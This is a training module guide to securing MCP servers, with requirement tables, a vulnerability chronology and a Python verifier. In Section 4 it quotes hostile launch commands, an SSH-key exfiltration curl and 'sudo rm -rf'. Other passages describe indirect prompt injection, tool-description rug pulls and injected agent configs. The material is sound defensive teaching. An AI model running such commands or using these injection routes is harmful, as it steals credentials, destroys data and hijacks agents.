# Security and authorization in MCP: the complete module guide

> Compiled on 02.08.2026. Primary sources opened 01–02.08.2026, vulnerability registries checked
> entry by entry on 02.08.2026. Everything refers to protocol revision `2026-07-28`.

## Why this file

This is not a threat map and not a landscape overview. It is a list of what shows up in your
server's code, and of how each item is verified. A deep audit of your own server comes later in
the program, but it will go **over the code you write this week**: whatever is not built in now
will have to be rewritten.

The July 28 revision rewrote the threat model in three places at once. Sessions are removed, so
"I'll check the token on connect" no longer has anything to hang on to. Confirmation of
destructive actions is written with different code. And there is a new data channel through the
client, which the specification explicitly tells you to treat as hostile.

One more remark, for those who read texts like this as "this is for people who write badly". A
check against the vulnerability registries as of 02.08.2026 gives a solid picture, not a
selection of examples. Published CVEs exist for **all five official SDKs** (Python, TypeScript,
Java, Rust, Ruby), for **both reference servers**, for the debugger of the protocol itself, and
for GitHub's and Google's own MCP servers. The classes repeat exactly the ones in the list of
requirements below.

---

## 1. Five requirements plus a sixth

The only table in this file worth keeping open while you work.

| # | Requirement | What shows up in the code | How it is verified |
|---|---|---|---|
| 1 | We do not accept or forward someone else's token | A token verification function (signature, `iss`, `aud` against your own canonical URI, `exp`, scope) in **every** handler. The upstream client is built from your own credentials | Negative test: a token with a foreign `aud` gives 401 and a reason in the log. Grep: there is no place where an incoming `Authorization` goes into an outgoing request |
| 2 | Loopback and `Origin` | An explicit `host="127.0.0.1"`, middleware that checks `Origin` and `Host` against an allowlist **before** the body is parsed, CORS not set to a wildcard | `curl` with a foreign `Origin` is rejected. The listening address is not `0.0.0.0` (in a container, look at the port publication) |
| 3 | The agent config is an executable artifact | The rules file and agent config go through code review like code, a CI lint on the appearance of a new launch command, zero secrets inside | Read the launch command of each server out loud. If it is unclear what it does, we do not connect it |
| 4 | Process isolation | Unprivileged user, read-only root filesystem, egress deny by default, parameterized calls, path canonicalization **after** symlink resolution | From your own tool, read a file outside the working directory and reach an arbitrary external address. Both must fail at the environment level |
| 5 | Manifest pinning | A canonicalized snapshot of the definitions **plus `instructions` from `server/discover`**, SHA-256, a reference stored outside the process, checked before every call. Several servers: name prefixing | Change one word in a tool description: the call is blocked, the diff is visible in the log |
| 6 | Output sanitization | A structured result per the output schema, external data marked as data, free text kept to a minimum | A tool that pulls in untrusted content must not be able to smuggle an instruction into the model's context |

Requirements 1 and 2 come into play together with Streamable HTTP. Over stdio there is no
authorization at all: the specification says outright that stdio implementations **SHOULD NOT**
follow the authorization section and should take credentials from the environment, and the
boundary is the process that launched them. Requirements 3–6 apply always.

---

## 2. Requirement 1: we do not accept or forward someone else's token

The current edition splits this into two dimensions, and the second is usually skipped.

**Audience validation:** the server does not check that the token was issued specifically for it
and accepts tokens issued for other services. **Passthrough:** it accepted someone else's token
and forwarded it downstream unchanged. This leads to a confused deputy: the downstream API trusts
the token as if you had validated it.

The norm of the specification, verbatim:

> "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server"

**What shows up in the code.** A separate token verification function: signature, `iss` against
the recorded issuer, `aud` against **your** canonical URI, `exp`, the set of scopes for the
specific tool. It is called in every handler, not once in a middleware on connect. The upstream
client is built from your own credentials: the incoming header is physically not passed to its
constructor.

**About RFC 8707.** A separate handler for resource indicators does not exist, this is a common
confusion. On the server they materialize as two things: the `resource` field in the metadata
document and the `aud` check against the same value.

**Where this has already broken.** In the official Python SDK on 15.07.2026: routing a request
by session identifier without checking that the presenter is the one who created that session
(CVE-2026-52869, 7.1, fix 1.27.2). Exactly the same two weeks later in the Ruby SDK: a stolen
identifier allowed executing `tools/call` in someone else's session (CVE-2026-67431, 8.3,
29.07.2026). One defect in two independent implementations: identity is not verified on every
call, only possession of the identifier is verified.

---

## 3. Requirement 2: loopback and `Origin`

An explicit `host="127.0.0.1"` in the HTTP transport launch. Not the default, not `0.0.0.0`, not
an environment variable without a loopback default. Plus middleware that checks `Origin` and
`Host` against an allowlist before the body is parsed. Plus CORS not set to a wildcard. Without
this, any web page open in a browser on the same machine can reach your server.

**A caveat, without which half of you will violate the requirement on a technicality.**
`0.0.0.0` inside a container is legitimate: there the boundary runs along the port publication.
The absolute wording "never `0.0.0.0`" is correct for a process on the host, while in Docker it
is a flag for review, not a blocker.

**Do not write your own address parser.** The specification asks for this verbatim:

> "Avoid implementing IP validation manually. Attackers exploit encoding tricks (octal, hex,
> IPv4-mapped IPv6) that custom parsers often miss"

The specification names a ready-made egress proxy: `stripe/smokescreen`.

**This requirement has been broken in four languages.** December 2025: TypeScript and Python
SDKs, DNS rebinding protection not enabled by default, 8.1 for both. March 2026: Java SDK, a
hardcoded wildcard in CORS. May 2026: Rust `rmcp`, Streamable HTTP did not validate `Host`, 8.8.
July 2026: Ruby SDK, missing `Host` and `Origin` checks. Four independent teams, the same line
of the checklist.

**The best argument in the whole chronology, and it is not about SDKs.** June 2026, MCP Toolbox
for Databases from Google, 9.4: the same class, skipped origin controls. The fix added two
flags, `--allowed-hosts` and `--allowed-origins`. **Both default to a wildcard**, for backward
compatibility. That is, the vulnerability is closed, but there was no safe default and there
still is none. "Fixed" is not the same as "secure out of the box", and closing that gap is your
line of code.

---

## 4. Requirement 3: the agent config is an executable artifact

The IDE launches MCP servers from project files, with your privileges and without isolation.
Planting a malicious config in a repository is enough to get code execution for everyone who
opened the project. The specification gives examples of malicious launch commands literally in
the text, including `curl -X POST -d @~/.ssh/id_rsa` and `sudo rm -rf`.

Normatively the client **MUST** show a consent dialog before execution, show the exact command
without truncation together with its arguments, explicitly mark the operation as potentially
dangerous, and allow cancelling. Then SHOULD: highlight `sudo`, `rm -rf`, network operations and
access outside the expected directories.

What you do: the agent config and the rules file go through code review like code, the CI lint
fails when a new launch command appears, there are no secrets inside the config at all, only
references to a secret manager.

**Two entries about the same editor in a row, August 2025.** The first: replacing the contents
of an already approved config in a shared repository infected the whole team (CVE-2025-54136).
The second is more interesting in its mechanics (CVE-2025-54135, fix 1.3.9): editing an
**existing** dotfile required confirmation, while creating a **new** one did not. Through
indirect injection an MCP server config was placed there, and it was picked up. The defect is
not in the permissions, but in the fact that permission was asked for the wrong event.

---

## 5. Requirement 4: process isolation

An unprivileged user, a container with a read-only root filesystem and only the working
directory writable, outbound traffic closed by default with an explicit list of domains. All
external calls are parameterized: an argument list instead of a string, placeholders instead of
SQL concatenation. Paths are canonicalized and checked by prefix **after** symlink resolution.

There is one check and it is an honest one: try, from your own tool, to read a file outside the
working directory and to reach an arbitrary external address. Both must fail at the environment
level, not at the level of "the model refused". **A model refusal is not a control.**

The anchor is twofold, and both are in official code, in the very reference servers that are
taken as a model. July 2025, `filesystem`: bypassing directory containment through a symlink
and through a prefix match with the allowed directory (CVE-2025-53109 and 53110, 7.3 for both).
December 2025, `mcp-server-git`: values like `--output=/path` were treated as flags, that is,
arbitrary file overwrite, plus accepting arbitrary paths at initialization. These are exactly
the two things from the paragraph above: path canonicalization and parameterization instead of
string assembly.

> **An open dispute you will find yourself.** One school: a container per server clears the bar,
> isolation per session does not, because sessions share an execution context. The other:
> Docker with a shared kernel is not a security boundary at all, real isolation is a micro-VM.
> This is not a dispute about facts, these are different threat models: in the first case it is
> about isolating tools and crashes, in the second about hostile code inside the sandbox. You
> choose by the threat model of your project.

---

## 6. Requirement 5: manifest pinning, and what changed in it

What is hashed is not "a set of descriptions" in general. What is hashed is a canonicalized
snapshot: for each tool the name, title, description, serialized input and output schemas and
annotations, sorted by name, deterministic serialization, then SHA-256 over the whole set. The
reference is stored outside the server, checked on connect and **before every call**, on a
mismatch a refusal and a diff in the log.

Why before every call and not only on connect: the list of tools is no longer tied to the
connection and legitimately changes via a notification. The drift between "approved" and
"called" is exactly the rug pull window.

**New in this revision, not yet in any guide.** The server **must** implement `server/discover`,
and its response carries an `instructions` field, described as text for the client's system
prompt. That is, the server has gained a **second channel of text straight into the model's
context**, besides the tool descriptions. If you pin only the tool list, this surface is open.
The snapshot must include `instructions` from `server/discover`.

**The second hole in pinning.** The uniqueness of a tool name is guaranteed only within one
server. The specification acknowledges the problem directly and recommends that aggregators and
proxies prefix names with a server identifier, separately warning that the name from
`serverInfo` is not suitable for this: it is not guaranteed to be unique. If you connect several
servers, add prefixing, otherwise a name collision bypasses pinning.

Pinning is the only one of the six requirements with no published CVE. The reason is clear:
this is not an implementation defect but a missing control, and its absence does not get a CVE.

---

## 7. Requirement 6: output sanitization

The specification requires exactly four things from a server: validate tool inputs, implement
access control, rate-limit calls and **sanitize outputs**. The fourth is usually not read, and
it is precisely about indirect injection: everything your tool pulled in from outside lands in
the model's context as text.

In practice: return a structured result per the output schema, keep free text to a minimum, mark
everything that came from an external source as data, not as instructions.

**A frame that explains why MCP is dangerous structurally, not by oversight.** An agent is
exploitable when it has three things at once: access to private data, contact with untrusted
content and a channel to the outside. Meta's wording (31.10.2025): an agent should have no more
than two of the three, and if all three are needed, it "should not be permitted to operate
autonomously and at a minimum requires supervision".

The wording is softer than the common paraphrase "requires human-in-the-loop", and it is worth
quoting as in the source. MCP assembles this triad by carelessness: you connect three servers
from different sources and get all three properties at once.

---

## 8. Destructive actions

### Numbers that change the decision

An audit of a catalog of 32,820 servers and 517,973 tools, snapshot of 01.07.2026, a verb
classifier, 76.1% of classifications high-confidence:

| Number | What it means |
|---|---|
| **28.1%** | of servers contain a destructive tool |
| **43.28%** | of servers provide at least one irreversible action **or** command execution |
| **94.1%** | probability that a stack of five unvetted servers contains such a tool |
| **96.4%** | of tools do not warn the model about the consequences of the call at all |

A caveat is mandatory for the 94.1%: it is not a measurement but the arithmetic `1 − (1 − 0.43)^N`
from **43%**, and server independence there is an approximation, not a fact. Tying this
probability to 28.1% is also seen, and it is arithmetically wrong.

### `destructiveHint` defaults to `true`

| `ToolAnnotations` field | Meaning | Default |
|---|---|---|
| `title` | human-readable name | none |
| `readOnlyHint` | does not modify the environment | `false` |
| **`destructiveHint`** | **may perform destructive updates. Meaningful only when `readOnlyHint == false`** | **`true`** |
| `idempotentHint` | a repeated call with the same arguments adds nothing. Same condition | `false` |
| `openWorldHint` | interacts with external entities | `true` |

Verified against the schema source. The `destructiveHint` row is the key one here: "did not set
annotations" means "my tool is considered destructive", and on your `list_orders` a reading
client will ask for confirmation. Annotations are not set for beauty.

### Confirmation is now written with different code

The pair "annotation plus confirmation" is right in meaning, but ready-made recipes for it are
outdated: server-initiated requests are forbidden entirely. The four-step mechanics are
described in the [protocol revision guide](protocol-revision-2026-07-28.md).

What matters here is not the mechanics but the requirement on state. This is the **strictest
wording of the entire security specification**, and it is a bundle of three obligations:

> "servers **MUST** treat `requestState` as an attacker-controlled input. If `requestState`
> influences authorization, resource access, or business logic, servers **MUST** protect its
> integrity (e.g. HMAC or AEAD) and **MUST** reject state that fails verification. Integrity
> protection **MAY** be omitted only when tampering can cause nothing worse than request failure."

Treat as hostile, protect integrity, reject what fails verification. There is exactly one
relaxation and it is narrow.

Then SHOULD against replay: the authenticated principal, a short TTL and the identifier of the
original request go inside the protected block. A separate warning that is usually lost: these
measures do **not** provide single use. If you need one-time use, you ensure it yourself.

Symmetric to the client: "Clients **MUST NOT** inspect, parse, modify, or make any assumptions
about the `requestState` contents". The state format is entirely yours, the client only carries
it.

Note where we have already seen this: the principal inside the state is exactly the defect that
produced two CVEs in two SDKs in July. The specification closed it with a norm, but you will
have to enforce the norm, because the state is restored by your code.

### A counterargument to "confirm everything"

A vendor's telemetry on its own agent:

> "Our telemetry showed users approved roughly 93% of permission prompts. The more approvals
> a user sees, the less attention they pay to each, becoming over time much less diligent in
> their supervision"

The conclusion is the opposite of the intuitive one: frequent safe actions are approved
automatically inside a sandbox, and confirmation is kept for the rare and irreversible. A control
is a refusal on the server side, not a phrase in the system prompt: a model is a text generator,
not a policy engine.

---

## 9. Annotations work both ways

On your own server you are obliged to set annotations: for the client this is the only cheap
signal. You cannot trust other people's annotations:

> "clients **MUST** consider tool annotations to be untrusted unless they come from trusted
> servers"

In the schema the wording is longer: "all properties in `ToolAnnotations` are **hints**. They are
not guaranteed to provide a faithful description of tool behavior (including descriptive
properties like `title`)".

A malicious server will happily set `readOnlyHint: true` on a tool that formats a disk. The
security boundary is set by your code, gateway or container, not by a string from someone else's
service.

By ear this sounds like a contradiction, but in fact it is exactly what the specification says:
you must set your own, you must not trust others'.

---

## 10. Secrets

Three things that are caught in review within a minute.

**Keys in the agent config.** People write them straight there and do not think that this file
is read by the agent itself. June 2026, LibreChat, 9.6: interpolation of variables like `${VAR}`
in an MCP server's configuration allowed pulling the application's secrets out. In the same
place, as a second, less loud entry: users with **view-only** permissions received the server's
decrypted credentials.

The architecturally right answer: the secret lives in a proxy or gateway, the agent passes the
intent, the proxy substitutes the token. The raw secret does not reach the agent's memory and
physically cannot leak into a log or through an injection. Separately: the log pipeline must
cut credential values, otherwise the requirement "log the tool output before passing it to the
agent" itself becomes a leak.

**A fresh trap of this revision.** There is now the ability to mirror tool parameter values into
`Mcp-Param-*` HTTP headers for routing on intermediate nodes. The specification warns: marking
sensitive parameters this way is **SHOULD NOT**, header values are visible to network
intermediaries.

**A confirmation form is not for secrets.**

> "Servers **MUST NOT** use form mode elicitation to request sensitive information such as
> passwords, API keys, access tokens, or payment credentials"

and the paired requirement next to it:

> "Servers **MUST** use URL mode for interactions involving such sensitive information"

A clarification in the specification that removes half the questions: sensitive means secrets
and credentials. A name, an email and a username do not fall under the ban.

**Rotation.** There is no clear industry norm specifically for MCP. What exists: the requirement
of short and narrowly scoped tokens and validation on every request. The primary source gives no
specific TTLs, this is an open question.

---

## 11. Response codes: the norm and hardening

| Code | When | What we put in |
|---|---|---|
| `401` | no token, it is invalid or expired | `WWW-Authenticate`, preferably `scope`, a pointer to the resource metadata |
| `403` | the token is valid, **permissions are insufficient** | `error="insufficient_scope"` and **all** scopes needed for the operation in one response |
| `404` | hardening against tool enumeration, **not a specification norm** | at the team's decision, with the understanding that this is a deviation |

> Note: **About the advice to "return 404 instead of 403".** It appears in public write-ups, and
> its logic is clear: enumerating tool names does not turn into reconnaissance, because
> unauthorized and nonexistent look the same. But in its table of authorization codes the
> specification prescribes **403 with `insufficient_scope`**. That is, 404 is hardening, not the
> norm. If you write 404 as the norm, you get a nonconforming server. The order is: the norm
> first, then hardening as a deliberate deviation.

A separate norm that is forgotten: the server **MUST** respect the scope hierarchy. A holder of
a broad scope must not get a 403 on an operation that requires a narrow one.

---

## 12. Asymmetry: the server is obliged to do less than the client

This is the main frame of the whole authorization section. Almost all the weight of the
specification lies on the client, and almost all of it has already been written for you in the
SDK.

| Side | Obliged (MUST) | Recommended (SHOULD) |
|---|---|---|
| **MCP server** (resource server) | implement RFC 9728. Serve `authorization_servers` with at least one AS. Validate the token per OAuth 2.1 §5.2. Check that the token was issued specifically for it (audience). 401 on invalid or expired. **Do not accept or forward others' tokens.** Respect the scope hierarchy | `scope` in `WWW-Authenticate`. 403 `insufficient_scope` with the full set of needed scopes in one response. **Do not** put `offline_access` in `scopes_supported` |
| **MCP client** | use RFC 9728 to discover the AS. Support **both** PRM discovery mechanisms and **both** AS discovery mechanisms. PKCE with `S256`. Check PKCE support before starting and **refuse** if it is absent. Send `resource` (RFC 8707) in authorize and token regardless of support on the AS side. Validate `iss`. Do not send the server tokens of other AS. Key credentials by issuer | verify `state`. Least privilege principle when choosing scopes. A retry limit on step-up |
| **Authorization server** | OAuth 2.1 for confidential and public clients. At least one of RFC 8414 or OIDC Discovery. Strict comparison of redirect URIs with registered ones. Refresh token rotation for public clients. When serving `iss`, set `authorization_response_iss_parameter_supported: true` | support CIMD. Serve `iss`. Issue short-lived access tokens |

**Your server is an RFC 9728 document, a 401 and a token verifier.** About a quarter of the list.

---

## 13. The table of three revisions: what appeared and when

In discussions everything is lumped into "the specification tightened authorization", although
the changes are spread across three releases. The big restructuring happened **not on
28.07.2026, but on 25.11.2025**.

| Requirement | 2025-06-18 | 2025-11-25 | 2026-07-28 |
|---|---|---|---|
| Server as an OAuth resource server, RFC 9728 | MUST | yes | yes |
| PKCE on the client | MUST | yes | yes |
| **Check PKCE support before starting the flow**, `S256` MUST | no | yes, new | yes |
| RFC 8707 `resource` in authorize and token | MUST | yes | yes |
| Audience validation on the server | MUST | yes | yes |
| AS discovery | RFC 8414 only (MUST) | RFC 8414 **or** OIDC (AS MUST at least one, client MUST both) | same |
| Order of probing well-known endpoints | not defined | yes, defined | yes, plus a requirement to check `issuer` in the document |
| PRM: fallback to well-known without `WWW-Authenticate` | no | yes | yes |
| Dynamic client registration (DCR) | SHOULD | MAY | **MAY + Deprecated** |
| CIMD (client metadata documents) | no | SHOULD | SHOULD |
| Pre-registration as an explicit option | no | yes | yes |
| `scope` in `WWW-Authenticate`, `scopes_supported` | no | SHOULD | yes |
| 403 `insufficient_scope` and step-up | no | yes | yes, plus scope union on the client (SEP-2350) |
| `iss` per RFC 9207 | no | no | yes, AS SHOULD, client MUST validate (SEP-2468) |
| `application_type` in DCR | no | no | yes, MUST (SEP-837) |
| Binding client credentials to the issuer | no | no | yes, MUST (SEP-2352) |
| Refresh token section | no | no | yes, new |
| "Mix-Up Attacks" section | no | no | yes, set apart |
| Scope hierarchy respected by the server | no | no | yes, MUST |

The mandatory status of resource indicators (RFC 8707) dates from **2025-06-18**, not from the
latest revision.

**A structural detail.** In `2026-07-28` the authorization section is split into **four pages**
(`authorization`, `authorization-server-discovery`, `client-registration`,
`security-considerations`). Links to the old single-page anchor break. Check your docs and code.

**What sessionless changed.** Direct changes in the authorization section: zero. But one wording
changed, and it is telling. In earlier revisions: "authorization **MUST** be included in every
HTTP request from client to server, **even if they are part of the same logical session**". In
the current one the tail about the session is removed as unnecessary.

Two consequences follow. First: validation on every call was the norm before too, so whoever did
"I'll check the token on `initialize`, then trust the session" had been violating the
specification for a year already. Now they simply have no `initialize` to hang on to. Second:
the technique of "binding the session to the credential" has ceased to exist as a mechanism.

---

## 14. Checklist of the working minimum for your own remote server

### Done by your server (mandatory)

- [ ] An RFC 9728 Protected Resource Metadata document with the fields `resource`,
      `authorization_servers` (at least one), `scopes_supported`, `bearer_methods_supported`. In
      both official SDKs it is generated from configuration, not written by hand.
- [ ] Serve the document in at least one of two ways: `resource_metadata` in `WWW-Authenticate`
      on a 401, or a well-known URI. The SDK does both.
- [ ] 401 on a request without a token, with `WWW-Authenticate` and, preferably, with `scope`.
- [ ] Token validation on **every** request: signature, `iss`, `aud` equal to the server's
      canonical URI, `exp`.
- [ ] 401 on an invalid or expired token.
- [ ] Scope check at the operation level, 403 `insufficient_scope` with **all** needed scopes at
      once.
- [ ] Respect the scope hierarchy.
- [ ] No forwarding of the incoming token to the upstream API. A separate token goes to the
      upstream, issued by the upstream provider.
- [ ] Do not accept tokens issued not for you.

### Done by your IdP (you choose it, you do not write it)

- [ ] OAuth 2.1, PKCE with `S256`, `code_challenge_methods_supported` in the metadata.
- [ ] RFC 8414 or OIDC Discovery.
- [ ] Support for RFC 8707 `resource`, or at least no failures on it.
- [ ] `iss` in authorization responses plus `authorization_response_iss_parameter_supported: true`.
- [ ] Preferably `client_id_metadata_document_supported: true`.
- [ ] Short access tokens, refresh token rotation for public clients.

### Done by the client SDK (for you)

PKCE and the check of its support, probing well-known endpoints in the right order, validation
of `iss` and of `issuer` from the metadata, `resource` in both requests, `application_type`,
keying credentials by issuer, scope union on step-up. This is exactly why you do not need to
write your own client: almost all the MUSTs of the specification lie there.

### Not part of the minimum, but not part of the specification either

Rate limiting, auditing of tool calls, tenant isolation, tool-level RBAC. The first two must be
done anyway. The last two are covered in the [multi-tenancy guide](multi-tenancy.md).

### A minimal verifier on the official Python SDK

```python
# mcp 2.0.0 (28.07.2026). In the 1.x line the class was called FastMCP.
from mcp.server import MCPServer, AuthSettings
from mcp.server.auth.provider import TokenVerifier, AccessToken
from pydantic import AnyHttpUrl

class MyTokenVerifier(TokenVerifier):
    async def verify_token(self, token: str) -> AccessToken | None:
        ...  # signature, iss, aud against your own URI, exp, scope. Your code

mcp = MCPServer(
    "Notes",
    token_verifier=MyTokenVerifier(),
    auth=AuthSettings(
        issuer_url=AnyHttpUrl("https://auth.example.com"),
        resource_server_url=AnyHttpUrl("http://127.0.0.1:8000/mcp"),
        required_scopes=["notes:read"],
    ),
)
```

`TokenVerifier` is a protocol with one async method, there is nothing else to implement. The SDK
documentation warns verbatim: "Pass one without the other and `MCPServer(...)` raises a **ValueError
before it ever serves a request**". The resource metadata document and the 401 with a pointer to
it are generated by the SDK itself from `AuthSettings`. Inside any handler the current identity
is read via `get_access_token()`, outside an authenticated HTTP request it returns `None`.

From the same place, relevant to requirement 1: "Headers are client-supplied input - never an
identity" (the separator in the original is a plain hyphen).

The second constructor argument, which embeds a full authorization server inside the server, is
marked by the documentation as an outdated approach: it predates the AS and RS split on which
the specification is built.

---

## 15. Confused deputy: four conditions and mitigations

The attack works when four conditions hold **simultaneously**:

- a static `client_id` of the proxy at a third-party authorization server;
- clients are allowed to register dynamically;
- the third-party server sets a consent cookie after the first time;
- the proxy does not do per-client consent before forwarding.

Mitigations, all MUST:

- a registry of approved `client_id` **per user** with a check before forwarding;
- your own consent screen with the client name, the requested scopes and the registered
  `redirect_uri`, with CSRF protection and a framing ban;
- a consent cookie with the `__Host-` prefix, `Secure`, `HttpOnly`, `SameSite=Lax`, bound to a
  specific `client_id`;
- `redirect_uri` is compared by exact string comparison, no patterns;
- `state` is cryptographically strong, single-use, TTL on the order of ten minutes.

A seventh item that is usually missing from write-ups: the cookie or session holding `state`
**MUST NOT** be set before the consent screen is approved, otherwise the consent screen is
useless.

---

## 16. What the revision changed in the threat model

The current security recommendations page contains eleven sections. Instead of Session Hijacking
there is **State Handle Hijacking**, plus four new ones: Mix-Up Attacks, Localhost Redirect URI
Impersonation, CIMD Trust Policies, SSRF against the authorization server.

- **Sessions are removed, the threat is renamed.** A server with authorization MUST verify all
  incoming requests. MUST NOT treat possession of a handle as authentication. SHOULD generate
  unpredictable handles with a TTL and bind them on its side to the authenticated user
  (`<user_id>:<handle>`, where `user_id` is taken from the verified token, not from the
  request).
- **`server/discover` is mandatory for a server.** A single mandatory endpoint makes mass
  scanning cheaper, and the `instructions` field gives a second channel of text into the system
  prompt. The specification does not require closing `discover` itself with authorization: the
  decision is left to the implementation, and it must be made deliberately.
- **SSRF against the authorization server.** By accepting client metadata documents, the AS
  itself downloads a URL received from a stranger. The cure is blocking internal and loopback
  ranges, timeouts and a limit on response size.
- **Cache.** A response with `cacheScope: "public"` can be reused between callers even from an
  authenticated endpoint. Covered in the [multi-tenancy guide](multi-tenancy.md).

> Note: **The page address changed twice.** The canonical address of the security
> recommendations of the current revision as of 03.08.2026 is
> `/docs/2026-07-28/tutorials/security/security_best_practices`. The path
> `/specification/2026-07-28/basic/security_best_practices` still works, but gives a permanent
> redirect, and the unnumbered `/specification/…/security_best_practices` leads to the previous
> revision, which covers hijacking of sessions that no longer exist in the protocol. The rule is
> the same: link to the address with the revision number and check whether it is a redirect.

---

## 17. Chronology: where this has already broken for the authors

All identifiers were checked against NVD and the MITRE registry on 02.08.2026. Order by record
publication date. The right column is the requirement number from section 1.

| Date | Product | What | Identifier and score | Req. |
|---|---|---|---|---|
| 13.06.2025 | **MCP Inspector**, protocol debugger | No authentication between client and proxy, command execution over stdio via an unauthenticated request | CVE-2025-49596, **9.4 CRITICAL**, fix 0.14.1 the same day | 2 |
| 02.07.2025 | **Official Filesystem MCP** | Bypassing directory containment through a symlink and through a prefix match with the allowed directory | CVE-2025-53109 and 53110, 7.3 for both | 4 |
| 09.07.2025 | `mcp-remote`, client wrapper | OS command injection through the `authorization_endpoint` of an untrusted server | CVE-2025-6514, **9.6 CRITICAL**, versions 0.0.5–0.1.15 | 3 |
| 01.08.2025 | **Cursor** | Replacing an **already approved** config in a shared repository infects the whole team | CVE-2025-54136, **7.2 from the CNA vs 8.8 from NIST**, fix 1.3 | 3 |
| 04.08.2025 | **Cursor** | Editing an existing dotfile requires confirmation, creating a **new** one does not | CVE-2025-54135, **8.5 from the CNA vs 9.8 from NIST**, fix 1.3.9 | 3 |
| 08.09.2025 | **MCP Inspector**, again | XSS escalating to command execution when connecting to an untrusted server | CVE-2025-58444, 8.6 HIGH, fix 0.16.6 | 3 |
| 22.09.2025 | Flowise, CustomMCP node | Bypassing protections, access to process spawning and the filesystem | CVE-2025-59528, **10.0 CRITICAL** | 4 |
| 02.12.2025 | **TypeScript and Python SDKs** | DNS rebinding protection not enabled by default for HTTP servers | CVE-2025-66414 and 66416, 8.1 for both, fixes 1.24.0 and 1.23.0 | 2 |
| 17.12.2025 | **Official `mcp-server-git`** | Accepting arbitrary paths. Values like `--output=/path` are treated as flags, that is, arbitrary file overwrite | CVE-2025-68143/68144/68145, **up to 9.1 from NIST vs 6.4 from the CNA** | 4 |
| 23.01.2026 | `gemini-mcp-tool` | `execAsync` with unvalidated input, 0-day | CVE-2026-0755, **9.8 CRITICAL** | 4 |
| 30.03.2026 | nginx-ui, MCP endpoint | Commands accepted without authentication | CVE-2026-33032, **9.8 CRITICAL**, versions ≤2.3.5 | 1 |
| 31.03.2026 | **Java SDK** | Hardcoded wildcard in CORS | CVE-2026-34237, 6.1 MEDIUM, fixes in three lines | 2 |
| 14.05.2026 | **Rust SDK `rmcp`** | Streamable HTTP did not validate `Host`, DNS rebinding | CVE-2026-42559, **8.8 HIGH**, fix 1.4.0 | 2 |
| 02.06.2026 | LibreChat | `${VAR}` interpolation in an MCP server config hands out the application's secrets. View-only users get the server's decrypted credentials | CVE-2026-32625 (**9.6**) and 44653 (6.5) | secrets |
| 13.06.2026 | **Google MCP Toolbox for Databases** | Skipped origin controls. **The fix added `--allowed-hosts` and `--allowed-origins`, both defaulting to `*`** | CVE-2026-11624, **9.4 CRITICAL**, up to 0.25.0 | 2 |
| 23.06.2026 | Amazon Q Developer / Language Servers for AWS | Trust boundary violation, possible arbitrary code execution | CVE-2026-12957, 8.5 / 7.8, up to 1.65.0 | 3 |
| 15.07.2026 | **Official Python SDK, three entries in one day** | Deprecated WebSocket transport without validation · routing by session identifier **without checking the principal who created it** · task handlers by task ID without binding to the session | CVE-2026-59950 (8.1, fix 1.28.1) · 52869 (7.1) · 52870 (7.6), both fix 1.27.2 | 1 |
| **28.07.2026** | **GitHub's own MCP server** | `CompletionsHandler` accesses `params.Ref` without a nil check: an unauthenticated client crashes the server. **On the very day the revision was published** | CVE-2026-47427, **7.5 HIGH**, fix 1.1.0 | 6 |
| **29.07.2026** | **Ruby SDK, five entries in one day** | No `Host`/`Origin` · `IO#gets` without a byte limit · sessions do not expire, memory exhaustion by an `initialize` flood · **session identifier not bound to the owner, someone else's `tools/call` with a stolen ID** · POST body parsed without a limit | CVE-2026-63118 (6.9) · 63119 (6.2) · 67430 (5.3) · **67431 (8.3)** · 67432 (7.5). All closed by **one** version, 0.23.0 | 1, 2 |

Three things on top of the table.

**Coverage is solid.** Five official SDKs out of five, both reference servers, the protocol
debugger, the own servers of two vendors.

**Freshness.** Two batches of entries in the week the revision came out: 28.07 and 29.07.

**The spread of scores is a separate story, not a margin of error.** For four entries the owner
of the code and the national institute disagreed: 6.4 against 9.1, 6.5 against 8.8, 7.2 against
8.8, 8.5 against 9.8. **In all four cases the lower score came from the one who owns the code.**
A score is assigned by two parties: the organization that was assigned the number (usually the
vendor or the platform where the code lives), and the national institute when the entry is
included in the database. They count by one standard, but score the vector differently. The
dispute is not about the fact of the hole, but about how severe it is. The practical conclusion
for reading other people's reports: a single number without saying whose score it is is not very
informative. A range is more honest.

> **What is intentionally absent from this list.** An identifier tied to the story of an "open
> CRM with 5,000+ customer records" **does not exist**: the MITRE registry returns
> `CVE_RECORD_DNE`. It circulates in write-ups together with an academic attribution and looks
> more reliable than its neighbors because of that. The conclusion for method: CVE numbers are
> checked against the registry one by one, a link to an article is not a guarantee.

---

## 18. An external reference point: nine recommendations, not nine requirements

The NSA issued a set of MCP security guidance on **20.05.2026**. There is **one** document, no
co-authorship by a second agency, about 17 pages.

Nine items: do not rely only on the protocol documentation · take supported tools from trusted
sources · run them through the strictest existing review process · separate systems and data by
trust level · grant minimal access · keep processing local · validate all inputs · treat any
automatic action as high-risk · keep detailed logs.

**How to read this list.** The PDF itself is closed to automated access: the domain returns 403
both to curl with a browser header and to two readers. Only the wording of the press release was
verified verbatim. The size of seventeen pages and the composition of the nine items were
reconstructed from two independent third-party write-ups, not from the text of the document: if
you open it yourself and count something different, the document is right.

**The word "requirements" must not be used here, these are recommendations.** The press release,
verbatim: "It offers **practical recommendations** for organizations adopting MCP in high-stakes
or production environments" and "**Adopters are advised** to proceed with caution".

> Note: **A compliance deadline for contractors of 30.09.2026 does not exist.** There is neither
> a mandate nor a deadline in the document. The only carrier of this date is a lead-generation
> site. If someone showed you such a date, it does not come from here.

Separately about the OWASP MCP Top 10 risk catalog: the codes are written with a year suffix
`:2025` (`MCP01:2025` and so on). The catalog's status is beta, and the page contradicts itself
on the name of the sixth item. October 2026 is not the first release, but the next one.

---

## 19. Where this is heading

Not needed for a first server, but worth knowing the direction.

- **Isolation of personal data through a gateway.** The proxy replaces personal data with
  reference tokens, the model works with masks, the gateway restores the values on the way back.
  Tooling: de-identification libraries and open weights of local classifiers of personal data.
  Specific names and their characteristics are intentionally not given here: this class of tools
  is updated faster than the module, and it must be checked on the day of adoption, not against
  our list.
- **A full audit of your own server**, tool poisoning and rug pull on your own code: this is a
  separate topic later in the program, and you will enter it with your code from this module.

---

## 20. What to check before applying

- **The CVE list goes stale within a week.** This was confirmed literally in the week of
  collection: two batches of entries came out after the material had been collected. Run a
  registry query on the key "Model Context Protocol" before relying on this table.
- **The address of the security recommendations page** changed together with the revision, the
  address of the elicitation page changed within a week.
- **The `ToolAnnotations` defaults** are checked against the schema source. As of 02.08.2026
  there is no patch revision, the last commit to the schema is dated the day of the release.
